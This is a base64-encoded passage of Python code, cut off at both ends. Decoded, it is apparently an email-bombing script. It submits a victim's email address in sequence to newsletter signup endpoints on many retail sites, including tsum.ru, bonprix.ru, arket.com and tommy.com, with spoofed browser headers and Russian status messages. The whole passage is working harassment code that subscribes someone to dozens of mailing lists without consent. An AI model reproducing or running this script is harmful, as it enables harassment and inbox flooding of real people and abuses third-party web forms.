I2ODIxNycsIGpzb249eyJlbWFpbCI6ZW1haWwsImZvcm0iOjI0NzIwLCJzZXR0aW5ncyI6MjQzNTEsImNvbmRpdGlvbnMiOjE1NDcxMiwiZGV2aWNlIjoicGMiLCJzb3VyY2UiOiJvcmdhbmljIiwidXJsIjoiaHR0cHM6Ly96YXJpbmEucnUvIiwiY3VzdG9tcyI6eyJmaWVsZHNfbGlzdC5hZ3JlZW1lbnQiOjEsIm1pbmRib3hEZXZpY2VVVUlEIjoiNDg5OTM0NzgtM2ExZi00Y2VlLWFlNzItMGQxOWRkNmJiOTU4In0sInV0bV9zb3VyY2UiOiJ5YW5kZXgifSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkudHN1bS5ydS9zdWJzY3JpYmUnLCBoZWFkZXJzPXsnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV83KSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTUuMiBTYWZhcmkvNjA1LjEuMTUnfSwganNvbj17ImdlbmRlciI6IkYiLCJlbWFpbCI6ZW1haWwsInByaXZhY3lQb2xpY3kiOid0cnVlJywiaWQiOiJzdWJfbmV3cyIsInNvdXJjZSI6InN1YnNfZm9vdGVyIiwiQ09NUE9ORU5UX05BTUUiOiJ0c3VtOnBvcHVwLmxlYXZlIn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSBlbWFpbC5yZXBsYWNlKCdAJywgJyU0MCcpCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly90dm9lLnJ1L2FqYXgvc3Vic2NyaWJlX3VzZXIucGhwJywgZGF0YT17J2RhdGEnOiAnc2Vzc2lkPTdjYzBlMjRiMGExMmZhNjBjMjIyOTQ5ZDQ2Zjc4MzlhJnR5cGU9c3Vic2NyaWJlJm5vdGU9WSZsaWNlbnNlc19zdWJzY3JpYmU9WSZFTUFJTD17fSZsaWNlbnNlc19wb3B1cD1ZJndlYl9mb3JtX3N1Ym1pdD0lRDAlOUYlRDAlQkUlRDAlQjQlRDAlQkYlRDAlQjglRDElODElRDAlQjAlRDElODIlRDElOEMlRDElODElRDElOEYnLmZvcm1hdChlbnRlcil9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3dlYi5wb3BtZWNoYW5pYy5ydS93ZWIvY29udGFjdHMvNjAyMS8/dmlkPTEwMTI4NjgzNzM2JywganNvbj17ImVtYWlsIjplbWFpbCwiZm9ybSI6MTQ3MzUsInNldHRpbmdzIjoxNDU5NCwiY29uZGl0aW9ucyI6MTQ2ODM3LCJkZXZpY2UiOiJwYyIsInNvdXJjZSI6Im9yZ2FuaWMiLCJ1cmwiOiJodHRwczovL3d3dy5zZWxhLnJ1LyIsImN1c3RvbXMiOnsiYWdyZWVtZW50IjoxLCJtaW5kYm94RGV2aWNlVVVJRCI6ImI3MmNlNzAzLTFhOTMtNDU2Yy04YjRjLTg5MDFlZTZiM2ViYiJ9LCJ1dG1fc291cmNlIjoieWFuZGV4In0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSBlbWFpbC5yZXBsYWNlKCdAJywgJyU0MCcpCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkubWluZGJveC5ydS92My9qcy9vcGVyYXRpb25zL2FzeW5jP3ZlcnNpb249MS4wLjI3NCZ0cmFuc3BvcnQ9YmVhY29uJm9wZXJhdGlvbj1vcHRpbiZvcmlnaW5Eb21haW49d3d3LnNlbGEucnUnLCAnb3JpZ2luRG9tYWluPXd3dy5zZWxhLnJ1JmRldmljZVVVSUQ9YjcyY2U3MDMtMWE5My00NTZjLThiNGMtODkwMWVlNmIzZWJiJm9wZXJhdGlvbj1vcHRpbiZpYW5hVGltZVpvbmU9RXVyb3BlJTJGTW9zY293JmRhdGE9JTdCJTIyY3VzdG9tZXIlMjIlM0ElN0IlMjJlbWFpbCUyMiUzQSUyMnt9JTIyJTJDJTIyc3Vic2NyaXB0aW9ucyUyMiUzQSU1QiU3QiUyMmJyYW5kJTIyJTNBJTIyU2VsYSUyMiUyQyUyMnBvaW50T2ZDb250YWN0JTIyJTNBJTIyRW1haWwlMjIlN0QlNUQlN0QlMkMlMjJwb2ludE9mQ29udGFjdCUyMiUzQSUyMmhlbGxvbWFpbGZvb3RlciUyMiU3RCcuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93ZWIucG9wbWVjaGFuaWMucnUvd2ViL2NvbnRhY3RzLzQyMTYvP3ZpZD0xMDE0MzY0MDc3MycsIGpzb249eyJlbWFpbCI6ZW1haWwsImZvcm0iOjI3NTg5LCJzZXR0aW5ncyI6MjcyMTMsImNvbmRpdGlvbnMiOjE1Njg2NiwiZGV2aWNlIjoicGMiLCJzb3VyY2UiOiJ1dG0iLCJ1cmwiOiJodHRwczovL3d3dy5ndWxsaXZlci5ydS9jYXRhbG9nL29kZXpoZGE/YnJhbmRzPWd1bGxpdmVyLGd1bGxpdmVyLWJhYnkmdXRtX3NvdXJjZT15YW5kZXgmdXRtX21lZGl1bT1jcGMmdXRtX3Rlcm09Ym5nbHZyXy0tLWF1dG90YXJnZXRpbmcmdXRtX2NvbnRlbnQ9dGV4dGxpbmtfYXcyMl8yJnV0bV9jYW1wYWlnbj1jYXRlZ29yaWVzX2F1dG90YXJnZXRpbmdfbXNrX3BvaXNrJnljbGlkPTE4MDk0MTI2MTQ1NDI2NDc3MjQ4IiwiY3VzdG9tcyI6eyJhZ3JlZW1lbnQiOjEsIm1pbmRib3hEZXZpY2VVVUlEIjoiMjE4N2YzMDQtZmUyMi00ZDFmLWI0NTgtMGI3OGRkZTNhYzE2In0sInV0bV9zb3VyY2UiOiJ5YW5kZXgiLCJ1dG1fbWVkaXVtIjoiY3BjIiwidXRtX2NhbXBhaWduIjoiY2F0ZWdvcmllc19hdXRvdGFyZ2V0aW5nX21za19wb2lzayIsInV0bV9jb250ZW50IjoidGV4dGxpbmtfYXcyMl8yIiwidXRtX3Rlcm0iOiJibmdsdnJfLS0tYXV0b3RhcmdldGluZyJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5jb3NzdG9yZXMuY29tL2xvY2FsL2NvbXBvbmVudHMvbW9yaXpvL21haW4uc3Vic2NyaWJlL2FqYXgucGhwJywgZGF0YT17J2VtYWlsJzogZW1haWwsJ2dlbmRlckNvZGUnOiAwLCdhY3Rpb24nOiAnc3Vic2NyaWJlJywnYnJhbmRfaWQnOiAxfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuYm9ucHJpeC5ydS9uZXdzbGV0dGVyL3Blcm1pc3Npb24vJywgZGF0YT17J2xheWVyJzogJ2hvbWUnLCdlbWFpbCc6IGVtYWlsLCdzb3VyY2VQYWdlQ2xpY2snOiAnbmxMYXllclNlbmQnfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuYXJrZXQuY29tL2xvY2FsL2NvbXBvbmVudHMvbW9yaXpvL21haW4uc3Vic2NyaWJlL2FqYXgucGhwJywgZGF0YT17J2VtYWlsJzogZW1haWwsJ2dlbmRlckNvZGUnOiAnMSB0YWJpbmRleD0nLCdhY3Rpb24nOiAnc3Vic2NyaWJlJ30sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSBlbWFpbC5yZXBsYWNlKCdAJywgJyU0MCcpCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL21jLnVzNC5saXN0LW1hbmFnZS5jb20vc3Vic2NyaWJlL2Zvcm0tcG9zdC1qc29uP3U9YTc1ZDRiNGExZmM0NDg3OTc5NjZjM2I5MiZpZD0wNTFmYWVmNTZmJnBvcHVwPXRydWUmRU1BSUw9e30mYl9hNzVkNGI0YTFmYzQ0ODc5Nzk2NmMzYjkyXzA1MWZhZWY1NmY9JmM9ZG9qb19yZXF1ZXN0X3NjcmlwdF9jYWxsYmFja3MuZG9qb19yZXF1ZXN0X3NjcmlwdDEnLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSBlbWFpbC5yZXBsYWNlKCdAJywgJyU0MCcpCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkubWluZGJveC5ydS92My9qcy9vcGVyYXRpb25zL2FzeW5jP3ZlcnNpb249MS4wLjI3NCZ0cmFuc3BvcnQ9YmVhY29uJm9wZXJhdGlvbj11c2Vyc3Vic2NyaXB0aW9uJmVuZHBvaW50SWQ9bGVvbWF4MjQtd2Vic2l0ZSZvcmlnaW5Eb21haW49d3d3Lmxlb21heC5ydScsICdvcmlnaW5Eb21haW49d3d3Lmxlb21heC5ydSZkZXZpY2VVVUlEPTA2YjEzMjE1LThlYjItNGE1Ny1iYjZkLThkNDAxMWIwM2QwOSZvcGVyYXRpb249dXNlcnN1YnNjcmlwdGlvbiZpYW5hVGltZVpvbmU9RXVyb3BlJTJGTW9zY293JmVuZHBvaW50SWQ9bGVvbWF4MjQtd2Vic2l0ZSZkYXRhPSU3QiUyMmN1c3RvbWVyJTIyJTNBJTdCJTIyZW1haWwlMjIlM0ElMjJ7fSUyMiUyQyUyMmN1c3RvbUZpZWxkcyUyMiUzQSU3QiUyMnV0bXNvdXJjZSUyMiUzQSUyMnlhbmRleCUyMiU3RCUyQyUyMnN1YnNjcmlwdGlvbnMlMjIlM0ElNUIlN0IlMjJicmFuZCUyMiUzQSUyMkxlb21heDI0JTIyJTJDJTIycG9pbnRPZkNvbnRhY3QlMjIlM0ElMjJFbWFpbCUyMiU3RCU1RCU3RCUyQyUyMnBvaW50T2ZDb250YWN0JTIyJTNBJTIyZm9vdGVyJTIyJTdEJy5mb3JtYXQoZW50ZXIpLCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL21vbnJvMjQucnUvYWpheC5zdWJzY3JpYmUucGhwJyxkYXRhPXsnZmlyc3RuYW1lJzogJ9CT0LXQvdCw0LTQuNC5JywnZW1haWwnOiBlbWFpbCwnbW9iJzogMH0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3Lmxhc3NpZXNob3AucnUvYWpheC9yZWdpc3RyYXRpb25fYmFubmVyX3N1YnNjcmliZS5waHAnLCBkYXRhPXsnZW1haWwnOiBlbWFpbH0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vcnUudG9tbXkuY29tL3djcy9yZXNvdXJjZXMvc3RvcmUvMzAwMjMvbmV3c2xldHRlci9zdWJzY3JpYmUnLCBqc29uPXsic3RvcmVJZCI6IjMwMDIzIiwic291cmNlQ29kZSI6IkZPT1RFUiIsImVtYWlsIjplbWFpbCwibGFuZ0lkIjoiLTIwIiwiaGF2ZUNvbWVGcm9tRm9vdGVyT3JIZWFkZXJOZXdzTGV0dGVyU2lnbnVwIjondHJ1ZScsIm1lbkNoZWNrYm94IjondHJ1ZScsIndvbWVuQ2hlY2tib3giOid0cnVlJywia2lkc0NoZWNrYm94IjondHJ1ZSd9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL2xpY2hpLmNvbS9hcGkvc2l0ZS9zdWJzY3JpYmU/c2hvcD0yJmxhbmc9MScsIGRhdGE9eydfc3Vic2NyaWJlX2VtYWlsXyc6ZW1haWx9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3Nlcmdpbm5ldHRpLnJ1L2JpdHJpeC90ZW1wbGF0ZXMvLmRlZmF1bHQvYWpheC9zdWJzY3JpYmUucGhwJyxkYXRhPXsnbWFpbCc6IGVtYWlsfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9jcnV6by5ydS9pbmRleC5waHA/cm91dGU9ZXh0ZW5zaW9uL21vZHVsZS9kZWNvcl9uZXdzbGV0dGVyL3NlbmQnLCBkYXRhPXsnbmV3X2VtYWlsJzogZW1haWwsJ2FncmVlJzogMX0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy